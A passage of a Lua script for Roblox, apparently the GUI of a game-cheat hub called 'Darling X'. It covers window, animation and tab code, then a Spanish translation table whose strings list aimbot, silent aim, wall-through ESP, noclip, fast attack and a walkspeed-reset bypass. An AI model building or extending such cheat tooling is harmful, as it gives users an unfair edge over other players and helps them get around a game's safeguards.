    failedConn = ts.TeleportInitFailed:Connect(function()
        if failedConn then pcall(function() failedConn:Disconnect() end) failedConn = nil end
        pcall(function() ts:Teleport(game.PlaceId, lp) end)
    end)

    if #pList <= 1 or myJobId == "" then
        pcall(function() ts:Teleport(game.PlaceId, lp) end)
    else
        local ok = pcall(function()
            ts:TeleportToPlaceInstance(game.PlaceId, myJobId, lp)
        end)
        if not ok then
            pcall(function() ts:Teleport(game.PlaceId, lp) end)
        end
    end
end

-- Floating Open Button (Always Displays the Darling Hub Logo)
local FloatingOpen = Instance.new("ImageButton", ScreenGui)
FloatingOpen.Name = "FloatingOpen"
FloatingOpen.Size = UDim2.new(0, 44, 0, 44)
FloatingOpen.Position = UDim2.new(0, 15, 0.20, 0)
FloatingOpen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FloatingOpen.BackgroundTransparency = 1
FloatingOpen.BorderSizePixel = 0
FloatingOpen.Image = GetLogoAsset()
FloatingOpen.ScaleType = Enum.ScaleType.Crop
FloatingOpen.AutoButtonColor = false
FloatingOpen.Active = true
FloatingOpen.Selectable = true
FloatingOpen.ZIndex = 100
FloatingOpen.Visible = false
Instance.new("UICorner", FloatingOpen).CornerRadius = UDim.new(0, 8)

-- Main Window (Liquid Glass Compact 440x300)
Main = Instance.new("Frame", ScreenGui)
Main.Name = "DarlingX_MainWindow"
Main.Visible = false
Main.Size = UDim2.new(0, 0, 0, 0)
Main.Position = UDim2.new(0.5, 0, 0.5, 0)
Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Main.BackgroundTransparency = 1
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Main.Active = true
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 22)

local MainScale = Instance.new("UIScale", Main)
MainScale.Scale = 1
local GlassFrames = {}

local function UpdateMobileScale()
    local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
    local widthScale = (viewport.X - 24) / 440
    local heightScale = (viewport.Y - 24) / 300
    MainScale.Scale = math.clamp(math.min(widthScale, heightScale), 0.65, 1)
end
UpdateMobileScale()
if camera then
    trackConn(camera:GetPropertyChangedSignal("ViewportSize"):Connect(UpdateMobileScale))
end

local MainStroke = Instance.new("UIStroke", Main)
MainStroke.Color = CurrentAccent
MainStroke.Thickness = 1.2
MainStroke.Transparency = 0.35
MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
RegisterThemeStroke(MainStroke)

-- Static Wallpaper Background
local WallpaperImage = Instance.new("ImageLabel", Main)
WallpaperImage.Name = "WallpaperImage"
WallpaperImage.Size = UDim2.new(1, 0, 1, 0)
WallpaperImage.Position = UDim2.new(0, 0, 0, 0)
WallpaperImage.BackgroundTransparency = 1
WallpaperImage.ImageTransparency = 1
WallpaperImage.Image = ""
WallpaperImage.ScaleType = Enum.ScaleType.Crop
WallpaperImage.Active = false
WallpaperImage.ZIndex = 0
Instance.new("UICorner", WallpaperImage).CornerRadius = UDim.new(0, 22)

-- Darkening Dim Overlay for High Contrast Glass Readability
local WallpaperDimOverlay = Instance.new("Frame", Main)
WallpaperDimOverlay.Name = "WallpaperDimOverlay"
WallpaperDimOverlay.Size = UDim2.new(1, 0, 1, 0)
WallpaperDimOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
WallpaperDimOverlay.BackgroundTransparency = 0.35
WallpaperDimOverlay.BorderSizePixel = 0
WallpaperDimOverlay.Active = false
WallpaperDimOverlay.ZIndex = 1
Instance.new("UICorner", WallpaperDimOverlay).CornerRadius = UDim.new(0, 22)

-- Cyber Neon Rain Animation Layer (High-Performance Recycled Object Pool)
local rainContainer = Instance.new("Frame", Main)
rainContainer.Name = "RainAnimationLayer"
rainContainer.Size = UDim2.new(1, 0, 1, 0)
rainContainer.BackgroundTransparency = 1
rainContainer.ClipsDescendants = true
rainContainer.Active = false
rainContainer.ZIndex = 2
Instance.new("UICorner", rainContainer).CornerRadius = UDim.new(0, 22)

local RainEnabled = true
local MaxRainDrops = 14
local RainPoolCapacity = 30
local rainPool = {}
local dropTweens = {}
local rainActive = false

-- Pre-instantiate pool once; zero runtime Instance.new or Destroy
for i = 1, RainPoolCapacity do
    local drop = Instance.new("Frame", rainContainer)
    drop.Name = "RainDrop_" .. i
    drop.Size = UDim2.new(0, 2, 0, 20)
    drop.Position = UDim2.new(0, 0, -0.2, 0)
    drop.BackgroundColor3 = CurrentAccent
    drop.BackgroundTransparency = 1
    drop.BorderSizePixel = 0
    drop.Active = false
    drop.Visible = false
    Instance.new("UICorner", drop).CornerRadius = UDim.new(1, 0)
    table.insert(rainPool, drop)
end

local function animateDrop(dropIndex)
    if not IsScriptRunning or not Main.Visible or not RainEnabled or dropIndex > MaxRainDrops then
        local drop = rainPool[dropIndex]
        if drop then drop.Visible = false end
        return
    end

    local drop = rainPool[dropIndex]
    if not drop then return end

    local startX = math.random(1, 99) / 100
    local targetX = startX - (math.random(3, 8) / 100)
    local dropLen = math.random(14, 26)
    local startTrans = math.random(2, 5) / 10
    local duration = math.random(4, 9) / 10

    drop.Size = UDim2.new(0, 2, 0, dropLen)
    drop.Position = UDim2.new(startX, 0, -0.15, 0)
    drop.BackgroundColor3 = CurrentAccent
    drop.BackgroundTransparency = startTrans
    drop.Visible = true

    if dropTweens[dropIndex] then
        pcall(function() dropTweens[dropIndex]:Cancel() end)
    end

    local tw = TweenService:Create(drop, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
        Position = UDim2.new(targetX, 0, 1.15, 0),
        BackgroundTransparency = 1
    })
    dropTweens[dropIndex] = tw

    tw.Completed:Connect(function(playbackState)
        if playbackState == Enum.PlaybackState.Completed or playbackState == nil then
            if IsScriptRunning and Main.Visible and RainEnabled and dropIndex <= MaxRainDrops then
                task.delay(math.random(1, 5) / 50, function()
                    if IsScriptRunning and Main.Visible and RainEnabled and dropIndex <= MaxRainDrops then
                        animateDrop(dropIndex)
                    else
                        drop.Visible = false
                    end
                end)
            else
                drop.Visible = false
            end
        else
            drop.Visible = false
        end
    end)
    tw:Play()
end

local function StartRainAnimation()
    if rainActive or not IsScriptRunning or not Main.Visible or not RainEnabled then return end
    rainActive = true
    local count = math.clamp(MaxRainDrops, 1, RainPoolCapacity)
    for i = 1, count do
        local stagger = (i - 1) * 0.06
        task.delay(stagger, function()
            if rainActive and Main.Visible and RainEnabled and i <= MaxRainDrops then
                animateDrop(i)
            end
        end)
    end
end

local function StopRainAnimation()
    rainActive = false
    for i, drop in ipairs(rainPool) do
        if dropTweens[i] then
            pcall(function() dropTweens[i]:Cancel() end)
            dropTweens[i] = nil
        end
        drop.Visible = false
    end
end

-- Strictly event-driven: start only when Main is visible and rain is enabled
Main:GetPropertyChangedSignal("Visible"):Connect(function()
    if Main.Visible and RainEnabled then
        StartRainAnimation()
    else
        StopRainAnimation()
    end
end)

if Main.Visible and RainEnabled then
    task.defer(StartRainAnimation)
end

-- Header Bar
local Header = Instance.new("Frame", Main)
Header.Name = "Header"
Header.Size = UDim2.new(1, 0, 0, 42)
Header.BackgroundTransparency = 1
Header.ZIndex = 15

-- Logo Badge
local LogoBadge = Instance.new("ImageLabel", Header)
LogoBadge.Name = "HeaderLogo"
LogoBadge.Size = UDim2.new(0, 24, 0, 24)
LogoBadge.Position = UDim2.new(0, 14, 0.5, -12)
LogoBadge.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
LogoBadge.BackgroundTransparency = 0
LogoBadge.Image = GetLogoAsset()
LogoBadge.ScaleType = Enum.ScaleType.Crop
LogoBadge.ZIndex = 16
Instance.new("UICorner", LogoBadge).CornerRadius = UDim.new(0, 6)
local lStroke = Instance.new("UIStroke", LogoBadge)
lStroke.Color = CurrentAccent
lStroke.Thickness = 1
RegisterThemeStroke(lStroke)

local Title = Instance.new("TextLabel", Header)
Title.Position = UDim2.new(0, 46, 0, 6)
Title.Size = UDim2.new(0, 180, 0, 16)
Title.BackgroundTransparency = 1
Title.Text = APP_TITLE .. "  •  " .. APP_VERSION
Title.Font = Enum.Font.GothamBold
Title.TextSize = 13
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.ZIndex = 16

local SubTitle = Instance.new("TextLabel", Header)
SubTitle.Position = UDim2.new(0, 46, 0, 22)
SubTitle.Size = UDim2.new(0, 140, 0, 12)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "by " .. APP_AUTHOR
SubTitle.Font = Enum.Font.GothamMedium
SubTitle.TextSize = 8.5
SubTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
SubTitle.TextXAlignment = Enum.TextXAlignment.Left
SubTitle.ZIndex = 16

-- Window Controls (Minimize & Close)
local function createHeaderBtn(symbol, offsetRight, color, callback)
    local btn = Instance.new("TextButton", Header)
    btn.Size = UDim2.new(0, 24, 0, 24)
    btn.Position = UDim2.new(1, offsetRight, 0.5, -12)
    btn.BackgroundColor3 = Color3.fromRGB(15, 12, 22)
    btn.BackgroundTransparency = 0.5
    btn.Text = symbol
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 12
    btn.TextColor3 = color
    btn.AutoButtonColor = false
    btn.Active = true
    btn.ZIndex = 16
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 7)
    local str = Instance.new("UIStroke", btn)
    str.Color = color
    str.Thickness = 1
    ConnectButton(btn, callback)
    return btn
end

local function minimizeUI()
    TweenService:Create(Main, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
        Size = UDim2.new(0, 0, 0, 0), Position = UDim2.new(0.5, 0, 0.5, 0)
    }):Play()
    task.wait(0.25)
    Main.Visible = false
    FloatingOpen.Visible = true
    Notify(APP_TITLE, "Minimized. Tap floating button to reopen.")
end

local opening = false
maximizeUI = function()
    if opening then return end
    opening = true
    FloatingOpen.Visible = false
    Main.Visible = true
    Main.Size = UDim2.new(0, 0, 0, 0)
    Main.Position = UDim2.new(0.5, 0, 0.5, 0)
    local openTween = TweenService:Create(Main, TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 440, 0, 300), Position = UDim2.new(0.5, -220, 0.5, -150)
    })
    openTween.Completed:Connect(function()
        opening = false
    end)
    openTween:Play()
end

local function fullCloseUI()
    IsScriptRunning = false
    for _, c in ipairs(ActiveConnections) do pcall(function() c:Disconnect() end) end
    pcall(function() ScreenGui:Destroy() end)
    pcall(function()
        local target = parentGui or (lp and lp:FindFirstChild("PlayerGui"))
        if target then
            for _, old in ipairs(target:GetChildren()) do
                if old.Name:find("DarlingX") or old.Name:find("DarlingHub_FOV") or old.Name:find("DarlingHub_Tracers") then
                    old:Destroy()
                end
            end
        end
    end)
    print("[Darling X] Closed completely.")
end

createHeaderBtn("-", -60, Color3.fromRGB(255, 255, 255), minimizeUI)
createHeaderBtn("X", -30, Color3.fromRGB(255, 75, 75), fullCloseUI)
ConnectButton(FloatingOpen, maximizeUI)

-- Dragging Support
local dragging, dragStart, startPos
Header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        if dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end
end)

-- Page Container (Right Side Content Area)
local PageContainer = Instance.new("Frame", Main)
PageContainer.Name = "PageContainer"
PageContainer.Size = UDim2.new(1, -120, 1, -52)
PageContainer.Position = UDim2.new(0, 112, 0, 44)
PageContainer.BackgroundTransparency = 1
PageContainer.ZIndex = 10
PageContainer.ClipsDescendants = false
PageContainer.Active = false

-- Side Navigation Dock Capsule (Adaptive ScrollingFrame to prevent clipping on mobile)
local BottomDock = Instance.new("ScrollingFrame", Main)
BottomDock.Name = "BottomDock"
BottomDock.Size = UDim2.new(0, 100, 1, -52)
BottomDock.Position = UDim2.new(0, 8, 0, 44)
BottomDock.BackgroundColor3 = Color3.fromRGB(12, 10, 18)
BottomDock.BackgroundTransparency = 0.55
BottomDock.ZIndex = 15
BottomDock.BorderSizePixel = 0
BottomDock.ScrollBarThickness = 0
BottomDock.AutomaticCanvasSize = Enum.AutomaticSize.Y
BottomDock.CanvasSize = UDim2.new(0, 0, 0, 240)
BottomDock.Active = true
Instance.new("UICorner", BottomDock).CornerRadius = UDim.new(0, 14)
table.insert(GlassFrames, BottomDock)

local dockStroke = Instance.new("UIStroke", BottomDock)
dockStroke.Color = CurrentAccent
dockStroke.Thickness = 1.2
dockStroke.Transparency = 0.45
RegisterThemeStroke(dockStroke)

local dockPadding = Instance.new("UIPadding", BottomDock)
dockPadding.PaddingTop = UDim.new(0, 6)
dockPadding.PaddingBottom = UDim.new(0, 6)
dockPadding.PaddingLeft = UDim.new(0, 4)
dockPadding.PaddingRight = UDim.new(0, 4)

local DockLayout = Instance.new("UIListLayout", BottomDock)
DockLayout.SortOrder = Enum.SortOrder.LayoutOrder
DockLayout.FillDirection = Enum.FillDirection.Vertical
DockLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
DockLayout.VerticalAlignment = Enum.VerticalAlignment.Top
DockLayout.Padding = UDim.new(0, 4)
DockLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    BottomDock.CanvasSize = UDim2.new(0, 0, 0, DockLayout.AbsoluteContentSize.Y + 12)
end)

local Pages = {}
local DockButtons = {}
local TabOrderCounter = 0

-- Tab Manifest: Defines all hub tabs up-front for instant batch creation
local TABS_MANIFEST = {
    { id = "Home",     name = "Home",     icon = "house" },
    { id = "Aimbot",   name = "Aimbot",   icon = "crosshair" },
    { id = "PvP",      name = "PvP",      icon = "swords" },
    { id = "Macro",    name = "Macro",    icon = "bot" },
    { id = "Soru",     name = "Soru",     icon = "zap" },
    { id = "Esp",      name = "Visuals",  icon = "eye" },
    { id = "Config",   name = "Config",   icon = "sliders-horizontal" },
    { id = "Themes",   name = "Themes",   icon = "palette" },
}

local TAB_MIN_CANVAS = {
    Home = 950,
    Aimbot = 1450,
    PvP = 1350,
    Macro = 1100,
    Soru = 900,
    Esp = 950,
    Config = 1050,
    Misc = 1050,
    Themes = 1500
}

local function UpdatePageCanvas(page)
    if not page or not page:IsA("ScrollingFrame") then return end
    local tabKey = page.Name:gsub("Page$", "")
    local minH = TAB_MIN_CANVAS[tabKey] or 600
    local pList = page:FindFirstChildOfClass("UIListLayout")
    local spacing = pList and pList.Padding.Offset or 6

    local computedTotal = 0
    local count = 0
    for _, child in ipairs(page:GetChildren()) do
        if child:IsA("GuiObject") and not child:IsA("UIListLayout") and not child:IsA("UIPadding") then
            local h = child.Size.Y.Offset
            if h <= 0 then h = child.AbsoluteSize.Y end
            if h > 0 then
                computedTotal = computedTotal + h
                count = count + 1
            end
        end
    end
    if count > 1 then
        computedTotal = computedTotal + (count - 1) * spacing
    end

    local listContent = (pList and pList.AbsoluteContentSize.Y > 0) and pList.AbsoluteContentSize.Y or 0
    local totalHeight = math.max(computedTotal, listContent)
    page.CanvasSize = UDim2.new(0, 0, 0, math.max(totalHeight + 50, minH))
end

local function UpdateCardGeometry(card)
    if not card or not card.Parent then return end
    local list = card:FindFirstChildOfClass("UIListLayout")
    local pad = card:FindFirstChildOfClass("UIPadding")
    local padTop = pad and pad.PaddingTop.Offset or 7
    local padBottom = pad and pad.PaddingBottom.Offset or 7
    local padTotal = padTop + padBottom

    local spacing = list and list.Padding.Offset or 5
    local computedHeight = 0
    local count = 0
    for _, ch in ipairs(card:GetChildren()) do
        if ch:IsA("GuiObject") and not ch:IsA("UIListLayout") and not ch:IsA("UIPadding") and not ch:IsA("UIStroke") and not ch:IsA("UICorner") then
            local h = ch.Size.Y.Offset
            if h <= 0 then h = ch.AbsoluteSize.Y end
            if h > 0 then
                computedHeight = computedHeight + h
                count = count + 1
            end
        end
    end
    if count > 1 then
        computedHeight = computedHeight + (count - 1) * spacing
    end

    local layoutH = (list and list.AbsoluteContentSize.Y > 0) and list.AbsoluteContentSize.Y or 0
    local contentHeight = math.max(computedHeight, layoutH)
    local finalH = math.max(contentHeight + padTotal, 32)
    card.Size = UDim2.new(1, 0, 0, finalH)

    local parentPage = card.Parent
    if parentPage and parentPage:IsA("ScrollingFrame") then
        UpdatePageCanvas(parentPage)
    end
end

local function SelectTabById(targetId)
    if targetId == "Settings" then targetId = "Themes" end
    if targetId == "Misc" then targetId = "Config" end
    for _, tabMeta in ipairs(TABS_MANIFEST) do
        local id = tabMeta.id
        local p = Pages[id]
        if p then
            local isTarget = (id == targetId)
            p.Visible = isTarget
            if isTarget then
                p.CanvasPosition = Vector2.new(0, 0)
                for _, card in ipairs(p:GetChildren()) do
                    if card:IsA("GuiObject") and not card:IsA("UIListLayout") and not card:IsA("UIPadding") then
                        UpdateCardGeometry(card)
                    end
                end
                UpdatePageCanvas(p)
                task.defer(function() UpdatePageCanvas(p) end)
                task.delay(0.05, function() UpdatePageCanvas(p) end)
                task.delay(0.15, function() UpdatePageCanvas(p) end)
            end
        end
        local dbtn = DockButtons[id]
        if dbtn then
            local isTarget = (id == targetId)
            dbtn.isSelected = isTarget
            if isTarget then
                TweenService:Create(dbtn.btn, TweenInfo.new(0.18), {
                    BackgroundColor3 = CurrentAccent,
                    BackgroundTransparency = 0.72
                }):Play()
                TweenService:Create(dbtn.stroke, TweenInfo.new(0.18), {
                    Color = CurrentAccent,
                    Thickness = 1.2
                }):Play()
                TweenService:Create(dbtn.pill, TweenInfo.new(0.18), { BackgroundTransparency = 0 }):Play()
                TweenService:Create(dbtn.icon, TweenInfo.new(0.18), { ImageColor3 = CurrentAccent }):Play()
                TweenService:Create(dbtn.label, TweenInfo.new(0.18), { TextColor3 = Color3.fromRGB(255, 255, 255) }):Play()
            else
                TweenService:Create(dbtn.btn, TweenInfo.new(0.18), {
                    BackgroundColor3 = Color3.fromRGB(20, 16, 32),
                    BackgroundTransparency = 0.55
                }):Play()
                TweenService:Create(dbtn.stroke, TweenInfo.new(0.18), {
                    Color = Color3.fromRGB(48, 42, 68),
                    Thickness = 0.8
                }):Play()
                TweenService:Create(dbtn.pill, TweenInfo.new(0.18), { BackgroundTransparency = 1 }):Play()
                TweenService:Create(dbtn.icon, TweenInfo.new(0.18), { ImageColor3 = Color3.fromRGB(200, 195, 225) }):Play()
                TweenService:Create(dbtn.label, TweenInfo.new(0.18), { TextColor3 = Color3.fromRGB(240, 235, 255) }):Play()
            end
        end
    end
end

-- ============================================================
-- MULTILINGUAL TRANSLATION ENGINE (DYNAMIC & INSTANT)
-- ============================================================
local TRANSLATIONS_DICT = {
    ["Spanish"] = {
        ["180"] = "180",
        ["2D Boxes"] = "Cajas 2D",
        ["2D Line"] = "Linea 2D",
        ["360"] = "360",
        ["3D Beam"] = "Rayo 3D",
        ["Accent Color & Theme Studio"] = "Estudio de Temas y Colores",
        ["Account & Player Statistics"] = "Estadisticas del Jugador",
        ["Aesthetic Studio Presets"] = "Ajustes Preestablecidos",
        ["Aim Mode"] = "Modo de Punteria",
        ["Aimbot"] = "Aimbot",
        ["Allows continuous mid-air jumping without cooldown"] = "Permite saltar en el aire continuamente sin recarga",
        ["Anti-Lava Damage"] = "Anti-Danio de Lava",
        ["Anti-Lava Immunity"] = "Inmunidad a la Lava",
        ["Apply Fast FFlags"] = "Aplicar Optimizacion FFlags",
        ["Apply Wallpaper"] = "Aplicar Fondo",
        ["Atmosphere Wallpaper"] = "Fondo de Pantalla Atmosferico",
        ["Atmosphere Wallpaper Presets (24 Styles)"] = "Fondos Atmosfericos (24 Estilos)",
        ["Auto Buso Haki"] = "Auto Haki de Armadura",
        ["Auto Combat"] = "Combate Automatico",
        ["Auto Race V3"] = "Auto Race V3",
        ["Auto Race V4"] = "Auto Race V4",
        ["Auto Skill Combo"] = "Auto Combo de Habilidades",
        ["Auto Skill on Soru"] = "Habilidad Automatica con Soru",
        ["Automatically activates Buso Armament Haki (No Ken)"] = "Activa automaticamente Buso Haki de armamento (sin Ken)",
        ["Automatically casts Race V3 ability in combat"] = "Lanza automaticamente la habilidad de Raza V3 en combate",
        ["Automatically triggers Race Awakening V4 when gauge is filled"] = "Activa despertar de Raza V4 cuando se llena la barra",
        ["B"] = "B",
        ["BELI"] = "BELI",
        ["BOUNTY"] = "RECOMPENSA",
        ["Background Dimming (%)"] = "Oscurecimiento de Fondo (%)",
        ["Balanced (65%)"] = "Equilibrado (65%)",
        ["Blue"] = "Azul",
        ["Both"] = "Ambos",
        ["Bottom"] = "Abajo",
        ["Bypasses walkspeed reset with direct physical impulse"] = "Evita el reinicio de velocidad con impulso fisico directo",
        ["C"] = "C",
        ["Calculates lead vector based on enemy velocity and ping"] = "Calcula anticipacion segun velocidad y ping",
        ["Camera FOV"] = "FOV de Camara",
        ["Camlock"] = "Camlock",
        ["Camlock (Combat Camera)"] = "Camlock (Camara de Combate)",
        ["Camlock Floating Widget"] = "Widget Flotante Camlock",
        ["Camlock Keybind"] = "Tecla de Camlock",
        ["Caps client to 22 FPS during Sanguine Z cooldown for physics boost"] = "Limita cliente a 22 FPS en cooldown de Sanguine Z para impulso",
        ["Cast Race V3 when in combat"] = "Activa Race V3 durante el combate",
        ["Cast Race V4 when gauge is full"] = "Activa Race V4 al llenarse la barra",
        ["Center"] = "Centro",
        ["Chams & Tracers"] = "Chams y Lineas",
        ["Chams Highlight Color"] = "Color de Chams",
        ["Clear / Dark Glass"] = "Limpiar / Cristal Oscuro",
        ["Combat Passives & Auto Skills"] = "Pasivas de Combate y Auto Habilidades",
        ["Combat PvP Status"] = "Estado de Combate PvP",
        ["Combat Targeting & Silent Aim"] = "Punteria de Combate y Silent Aim",
        ["Combat Tech"] = "Tecnicas de Combate",
        ["Combo Key"] = "Tecla de Combo",
        ["Combo Weapon"] = "Arma de Combo",
        ["Community"] = "Comunidad",
        ["Compact (80%)"] = "Compacto (80%)",
        ["Config"] = "Configuracion",
        ["Configuration Profiles"] = "Perfiles de Configuracion",
        ["Configuration Reset"] = "Reinicio de Configuracion",
        ["Copy Discord Invite Link"] = "Copiar Enlace de Discord",
        ["Copy Server JobId"] = "Copiar JobId del Servidor",
        ["Credits"] = "Creditos",
        ["Crystal (80%)"] = "Cristal (80%)",
        ["Custom Dash Length"] = "Distancia de Deslizamiento",
        ["Custom WalkSpeed"] = "Velocidad Personalizada",
        ["Custom Wallpaper"] = "Fondo Personalizado",
        ["Custom Wallpaper Studio"] = "Estudio de Fondos Personalizados",
        ["Cyan"] = "Cian",
        ["Dash Distance"] = "Distancia de Impulso",
        ["Destroys environmental lava kill zones and damage parts"] = "Destruye zonas de dano y lava del entorno",
        ["Detects safe zone and in-combat status indicators"] = "Detecta zona segura y estado de combate",
        ["Developer & Content Creator"] = "Desarrollador y Creador",
        ["Development Team & Content Creators"] = "Equipo de Desarrollo y Creadores",
        ["Devil Fruit Tracker"] = "Rastreador de Frutas",
        ["Direct Wallpaper"] = "Fondo Directo",
        ["Disable All Visuals"] = "Desactivar Todos los Visuales",
        ["Display aim boundary circle"] = "Muestra el circulo limite de punteria",
        ["Displays formatted usernames above character heads"] = "Muestra el nombre sobre la cabeza del jugador",
        ["Displays live gradient health bars and HP percentage"] = "Muestra barras de salud y porcentaje de vida",
        ["Displays movable on-screen JUMP button for touch"] = "Muestra un boton tactil movil de SALTO en pantalla",
        ["Displays movable on-screen action button for Sanguine Z"] = "Muestra boton flotante de accion para Sanguine Z",
        ["Displays movable on-screen button to toggle camera lock"] = "Muestra un boton movil en pantalla para alternar bloqueo de camara",
        ["Displays movable on-screen toggle for Dragon Gun M1"] = "Muestra un control movil en pantalla para Dragon Gun M1",
        ["Displays movable on-screen toggle for camera lock"] = "Muestra boton flotante para fijar camara",
        ["Displays player bounty or honor value in millions"] = "Muestra recompensa o valor de honor en millones",
        ["Displays targeting circle boundary on screen"] = "Muestra el limite del circulo de punteria en pantalla",
        ["Distance Indicator"] = "Indicador de Distancia",
        ["Dragon Gun M1"] = "Dragon Gun M1",
        ["Dragon Gun M1 Floating Widget"] = "Widget Flotante Dragon Gun M1",
        ["Draws dynamic bounding boxes around enemy players"] = "Dibuja recuadros dinamicos en enemigos",
        ["Draws line from bottom of screen to tracked players"] = "Dibuja linea desde abajo hacia jugadores",
        ["E"] = "E",
        ["ESP Style"] = "Estilo de ESP",
        ["ESP Text Font Size"] = "Tamano de Fuente ESP",
        ["ESP Visuals"] = "Visuales ESP",
        ["Enable All Visuals"] = "Activar Todos los Visuales",
        ["Enable Target Prediction"] = "Activar Prediccion de Blanco",
        ["Enable player visual highlights"] = "Activa el resaltado de jugadores",
        ["Enables custom movement speed multiplier"] = "Habilita multiplicador de velocidad personalizada",
        ["Enables high-performance player visual tracking"] = "Habilita rastreo visual de jugadores de alto rendimiento",
        ["English"] = "Ingles",
        ["Equipped Tool / Weapon"] = "Arma Equipada",
        ["Equips weapon and casts chosen skill upon Soru animation"] = "Equipa arma y lanza habilidad al hacer Soru",
        ["Esp"] = "Visuales",
        ["Executes rapid melee, sword, and fruit attack bursts"] = "Ejecuta rafagas veloces para melee, espadas y frutas",
        ["Executes rapid primary attacks on all nearby enemies"] = "Ejecuta ataques principales rapidos contra todos los enemigos cercanos",
        ["F"] = "F",
        ["FACTION"] = "FACCION",
        ["FOV"] = "FOV",
        ["FOV Color"] = "Color del FOV",
        ["FOV Position"] = "Posicion del FOV",
        ["FOV Radius"] = "Radio de FOV",
        ["FOV Thickness"] = "Grosor de FOV",
        ["FPS"] = "FPS",
        ["FRUIT"] = "FRUTA",
        ["Fast Attack"] = "Ataque Rapido",
        ["Fast Attack (Melee, Sword, Fruit)"] = "Ataque Rapido (Melee, Espada, Fruta)",
        ["Fast Flags"] = "Optimizacion Rapida",
        ["FFlags 1 (FPS Booster)"] = "FFlags 1 (Mejora de FPS)",
        ["120 FPS cap, smooth plastic textures, removes atmosphere fog, hides debris"] = "Limite de 120 FPS, texturas plasticas, elimina niebla y oculta escombros",
        ["No Animations"] = "Sin Animaciones",
        ["Stops non-attack animations to fix sideways bug and character freezes"] = "Detiene animaciones ajenas al ataque para corregir congelamientos",
        ["Fast Flags & Engine Tuning"] = "Fast Flags y Ajustes de Motor",
        ["Field of View"] = "Campo de Vision",
        ["Field of View (FOV Customization)"] = "Campo de Vision (FOV)",
        ["Forward velocity boost"] = "Impulso de velocidad hacia adelante",
        ["French"] = "Frances",
        ["Fruit"] = "Fruta",
        ["Game Stats"] = "Estadisticas de Juego",
        ["Glass Interface & Visual Effects"] = "Interfaz de Cristal y Efectos",
        ["Glass Transparency"] = "Transparencia de Cristal",
        ["Green"] = "Verde",
        ["Gun"] = "Arma",
        ["Gun Aura (Dragon Gun M1)"] = "Gun Aura (Dragon Gun M1)",
        ["Head"] = "Cabeza",
        ["High jump leap"] = "Salto de gran altura",
        ["High-distance forward velocity boost with keybind Z"] = "Impulso de velocidad frontal de larga distancia con tecla Z",
        ["Home"] = "Inicio",
        ["HumanoidRootPart"] = "HumanoidRootPart",
        ["Identifies equipped Devil Fruit power (Kitsune, Portal, etc.)"] = "Identifica la fruta equipada (Kitsune, Portal, etc.)",
        ["Illuminates full player character models through walls"] = "Ilumina modelos de jugadores a traves de paredes",
        ["Immunity to lava damage"] = "Inmunidad al danio de lava",
        ["In-Game Attributes"] = "Atributos del Juego",
        ["Increase dash distance"] = "Aumenta la distancia del deslizamiento",
        ["Infinite Jump"] = "Salto Infinito",
        ["Infinite Soru"] = "Soru Infinito",
        ["Interface Effects"] = "Efectos Visuales",
        ["Interface Language"] = "Idioma de Interfaz",
        ["Interface Scale"] = "Escala de Interfaz",
        ["Jump continuously in mid-air"] = "Salta continuamente en el aire",
        ["Keep Armament Haki active"] = "Mantiene el Haki de Armadura activo",
        ["LEVEL"] = "NIVEL",
        ["Language"] = "Idioma",
        ["Language & Localization"] = "Idioma y Localizacion",
        ["Large (120%)"] = "Grande (120%)",
        ["Load Configuration Profile"] = "Cargar Perfil de Configuracion",
        ["Load Config"] = "Cargar Configuracion",
        ["Lock camera onto enemy"] = "Fija la camara al enemigo",
        ["Locks camera perspective directly onto focused enemy player"] = "Fija la camara directamente sobre el jugador enemigo enfocado",
        ["Looking At Me"] = "Mirandome",
        ["Low HP"] = "Menor Vida",
        ["Master ESP"] = "ESP Principal",
        ["Master ESP Toggle"] = "Interruptor Maestro de ESP",
        ["Master Visuals & Chams"] = "Visuales Maestros y Chams",
        ["Max Range"] = "Rango Maximo",
        ["Max Soru Range"] = "Rango Maximo de Soru",
        ["Melee"] = "Cuerpo a Cuerpo",
        ["Misc"] = "Varios",
        ["Mouse"] = "Raton",
        ["Move smoothly through structures and physical obstacles"] = "Permite moverse a traves de estructuras y obstaculos",
        ["Movement"] = "Movimiento",
        ["Movement & Agility (PvP Physics)"] = "Movimiento y Agilidad (Fisicas PvP)",
        ["Multiplies dash distance for high-speed repositioning"] = "Multiplica distancia de dash para reposicionamiento rapido",
        ["Multiplies jump impulse for vertical escape and aerial combat"] = "Multiplica impulso de salto para escape vertical y combate",
        ["NPC Silent Aim"] = "Silent Aim en NPCs",
        ["Nearest"] = "Mas Cercano",
        ["Nearest Player"] = "Jugador Mas Cercano",
        ["Neon Rain Layer"] = "Lluvia Cyber Neon",
        ["Next (›)"] = "Siguiente (›)",
        ["Noclip Wallpass"] = "Noclip Traspasar Paredes",
        ["None"] = "Ninguno",
        ["Official Community & Discord"] = "Comunidad Oficial y Discord",
        ["Orange"] = "Naranja",
